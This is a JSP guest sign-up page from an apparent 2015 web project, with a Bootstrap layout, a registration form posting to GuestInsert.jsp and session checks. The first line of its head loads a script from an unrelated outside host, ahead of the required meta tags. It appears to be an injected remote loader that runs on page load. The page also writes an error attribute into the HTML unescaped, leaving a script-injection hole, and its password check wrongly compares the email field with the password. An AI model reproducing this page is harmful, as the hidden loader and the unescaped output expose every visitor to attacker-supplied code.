
<!DOCTYPE html>
<html lang="en">
  <head><script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">
	<title>Login</title>
    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    body{

	background-image:url("iWall/2s.jpg");
	background-size:cover;
}
body:before {
    content: " ";
    width: 100%;
    height:890px;;
    position: absolute;
    z-index: -1;
    top: 0;
    left: 0;
    background: -moz-radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);
	background: -webkit-radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);
 	background: radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);
 	background: -ms-radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);

}

.HX{
	padding-left: 250px;
	position: relative;
	top:40px;
}

.CHX{
	position: relative;
	top:60px;
}
.HX h2{

	text-align: left;
	color: #fff;
	font-size: 39px;
	font-family: Lato;
	font-weight: bolder;
}

.HX p{

	text-align: left;
	font-weight: bold;
	color: #fff;
	font-size: 22px;
	font-family: Lato;
}

.LS {

	border-radius: 8px;
}


.LS1 {

	border-radius: 8px;
}
.Fot{
	width:100%;
	top:350px;
	position:relative;
	padding-top:30px;
	background-color:#000;
	text-align: center;
	
}
.XLL {
	width:350px;
	height:399px;
	background-color: #fff;
}
.XXL{
	padding-left: 15px;
}
.XL {
	position:relative;
	right:-25px;
	width: 300px;
	height: 40px;
	padding-top:18px;
}
.FOT{
	position: relative;
	top:390px;
}
.FFF{
	position:relative;
	top:370px;
}
    </style>

  </head>
  <script type="text/javascript">
	function Changex() 
	{
		var newpass=document.getElementById('newpass');
		var cpass=document.getElementById('cpass');
		if(checkpass(newpass,cpass,"Password Does not match"))
			{
			return true;
			}
		return false;
	}
	
	function checkpass(elem1,elem2,helperMsg)
	{
		if(elem1.value==elem2.value)
			{
			return true;
			}
		else
			{
			alert(helperMsg);
			elem1.focus();
			return false;
			}
	}	
  </script>
<body>
    <%
    String error=(String) request.getAttribute("Error");
    if(error!=null){
    	out.write("<body><style> .L h2 { font-family:Lato; font-size:1.2em;	padding-top: 5px;height: 20px;width: 260px;background: #000;font-family: Lato;display: block;color: #fff;line-height: 11px;margin: 7px;padding-left: 20px;border-radius: 4px;background: rgba(0,0,0,0.5);position:relative; margin-left: 756px;top:108px; } </style> <div class=L> <h2>"+error+"</h2> </div>");
    }
    %>
    
    
	<%
	session=request.getSession();
	String ss=(String)session.getAttribute("xmail");
	if(ss==null)
	{
	%>
         <div class="container"><br/><br/>
            <ul class="nav nav-pills pull-left">
                <li class="active"> <a href="Home2.jsp"> Home</a> </li> 
                 <li class="dropdown active">
             <a href="#" data-toggle="dropdown" class="dropdown-toggle" >Sign-Up<span class="caret"></span></a>	             
           <ul class="dropdown-menu">
          
           <li > <a href="User.jsp">Faculty </a></li>
            <li class="divider"></li>
             <li class="active" > <a href="Guest.jsp">Guest  </a></li>
           
           
            </ul>
            </li>
            <li class="dropdown active">
              <li class="active" > <a href="Login1.jsp">Login</a></li>
	
         
           
           
            </ul>
            </li>
            </ul><br/><hr>
    </div>
        <div class="container">
            <div class="row">
            
             <div class="col-lg-4 CHX">
            <div class="list-group XLL">
                    <div class="account-wall">
                        <form class="form-horizontal XL" method="post" action="GuestInsert.jsp"   onsubmit="return Changex()"> <br/> 
                        
                        <input type="text" class="form-control" name="fn" placeholder="Enter Name" required autofocus> <br/>
                        <input type="email" class="form-control" name="em" placeholder="email" id="newpass" required autofocus> <br/>
                         <div class="form-inline"><input type="password" class="form-control" name="ps" id="cpass" placeholder="password" required autofocus>  <br/><br/>
                        
                           <input type="password" class="form-control" name="xuser4" placeholder="re-password" required autofocus><br/> <br/>
                             </div>    <div class="form-group">
			    <label for="nm23x" class="XXL">Upload Profile Pic:</label>
			    <input type="file"  id="MyId" name="pix" class="XXL">
			    	  </div>
                             <div class="form-inline">
              <label for="Mycl">Gender</label><br/>
              <select class="form-control SS7" name="gen">
                <option value="male">Male</option>
                <option value="female"> Female</option>
              </select>
            
                            
                            <button class="btn btn-info pull-right" type="submit"> Sign-Up</button> </div><br/><br/> 
                        
                        </form>
                    </div>
                </a> <br/>
                
                </a>
            </div>
        </div>
               <div class="col-lg-7 HX">

                <h2 class="lead">Welcome. </h2>
                <p>
               <strong>Guest..!</strong>  Whats Up ?<br/>
                Please Fill This Form.......
                </p>
               </div>
       
    </div>
    </div>
    </div>
	
</div>
				<div class="Cvv">
						<div class="container-fluid FFF">
							<div class="row">
						<div class="col-lg-12  FF">
							<h5>
							@2015 All Rights Reserved / Legal Notices / Privacy Policy  <small>Ajay Singh Bisht | 2015 | @002ajay (</em>Twitter</em>)</small>
							</h5>
						</div>
					</div>
				</div>
 <% } else { 
 	RequestDispatcher rd=request.getRequestDispatcher("home.jsp");
 	rd.forward(request, response);
 }%>
  <script src="jquery.min.js"></script>
			    <script src="js/bootstrap.min.js"></script>
			    <script src="js/docs.min.js"></script>
			    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
			    <script src="js/ie10-viewport-bug-workaround.js"></script>
			    <script>
				
				</script>
			  </body>
			</html>

